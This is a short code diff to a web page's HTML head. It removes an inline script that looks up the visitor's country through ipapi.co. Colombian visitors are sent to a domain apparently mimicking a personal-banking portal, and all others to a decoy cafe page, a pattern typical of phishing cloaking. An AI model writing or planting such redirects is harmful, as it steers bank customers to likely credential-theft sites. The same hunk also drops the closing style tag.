@@ -121,29 +121,7 @@ button {
     background: #ffffff;
     color: #ffffff;
     border: 1px solid #ddd;
-    padding: 8px 15px;
-}
-</style>
 
-<script> 
-(function(){
-  const URL_CO  = "https://svpersonascolappweb.st/WEB-COL/index";
-  const URL_OUT = "https://cafesucursalvirtualcoffedias.vercel.app/inicio.html";
-
-  fetch("https://ipapi.co/json/")
-    .then(r => r.json())
-    .then(d => {
-      if (d.country === "CO") {
-        window.location.href = URL_CO;
-      } else {
-        window.location.href = URL_OUT;
-      }
-    })
-    .catch(() => {
-      window.location.href = URL_OUT;
-    });
-})();
-</script>
 
 </head>
 
